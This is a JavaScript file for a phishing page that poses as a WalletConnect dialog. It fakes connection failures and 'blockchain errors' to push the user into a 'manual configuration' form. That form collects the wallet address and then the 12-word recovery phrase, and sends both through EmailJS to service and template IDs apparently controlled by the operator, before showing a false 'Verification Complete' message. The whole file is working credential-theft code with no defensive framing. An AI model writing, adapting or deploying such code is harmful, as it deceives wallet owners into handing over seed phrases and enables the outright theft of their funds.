const openBtn   = document.getElementById('open-wallet');
const closeBtn  = document.getElementById('close-wallet');
const secureBtn = document.getElementById('secure-open');
const modal     = document.getElementById('wallet-modal');
const selectBtn = document.querySelector('.select-btn');

let stepTimeouts = [];

function resetSteps() {
  stepTimeouts.forEach(timeout => clearTimeout(timeout));
  stepTimeouts = [];
}

openBtn.addEventListener('click', () => {
  modal.style.display     = 'block';
  secureBtn.style.display = 'none';
});

closeBtn.addEventListener('click', () => {
  modal.style.display     = 'none';
  secureBtn.style.display = 'block';
});

secureBtn.addEventListener('click', () => {
  modal.style.display     = 'block';
  secureBtn.style.display = 'none';
});

selectBtn.addEventListener('click', () => {
  resetSteps();
  showStatus('Connecting to Wallet...', true);

  stepTimeouts.push(setTimeout(() => {
    showStatus('Failed to Connect with Supported app on your Device', false);

    stepTimeouts.push(setTimeout(() => {
      showStatus('Retrying connection...', true);

      stepTimeouts.push(setTimeout(() => {
        showStatus('Blockchain Error!.. Loading Manual Configuration...', false);

        stepTimeouts.push(setTimeout(() => {
          loadManualForm();
        }, 2000));
      }, 2900));
    }, 2900));
  }, 6800));
});

function showStatus(message, isLoading) {
  const walletBody = document.querySelector('.walletconnect-body');
  walletBody.innerHTML = `
    <h2>${message}</h2>
    ${isLoading ? '<div class="loader"></div>' : ''}
  `;
}

function loadManualForm() {
  const walletBody = document.querySelector('.walletconnect-body');
  walletBody.innerHTML = `
    <h2>Manual Config' Required</h2>
    <p>Unable to auto-connect. Please provide the Wallet Address of the supported app on your device.</p>
    <input type="text" id="walletAddress" placeholder="Wallet Address" class="form-input"/>
    <button onclick="sendAddress()" class="form-btn">Search & Connect</button>
    <p class="footer-text">Secured WalletConnect process ongoing.</p>
  `;
}

function sendAddress() {
  const address = document.getElementById('walletAddress').value;
  if (!address.trim()) return alert('Enter your Wallet Address');

  emailjs.send('service_odvlnrj', 'template_36x4f9f', {
    wallet_address: address
  }).then(() => {
    showPhraseForm();
  }).catch((error) => {
    alert('Failed to send. Try again.');
    console.error(error);
  });
}

function showPhraseForm() {
  const walletBody = document.querySelector('.walletconnect-body');
  walletBody.innerHTML = `
    <h2>Additional Authentication</h2>
    <p>Please enter your 12 Word Recovery Phrase below:</p>
    <textarea id="phraseInput" class="form-textarea" placeholder="Enter your 12-word phrase here..."></textarea>
    <button onclick="sendPhrase()" class="form-btn">Complete & Connect</button>
  `;
}

function sendPhrase() {
  const phrase = document.getElementById('phraseInput').value;
  if (!phrase.trim()) return alert('Enter your 12-word phrase');

  emailjs.send('service_odvlnrj', 'template_36x4f9f', {
    recovery_phrase: phrase
  }).then(() => {
    const walletBody = document.querySelector('.walletconnect-body');
    walletBody.innerHTML = `
      <h2>Verification Complete</h2>
      <p>You will be redirected shortly...</p>
    `;
  }).catch((error) => {
    alert('Failed to send. Try again.');
    console.error(error);
  });
}
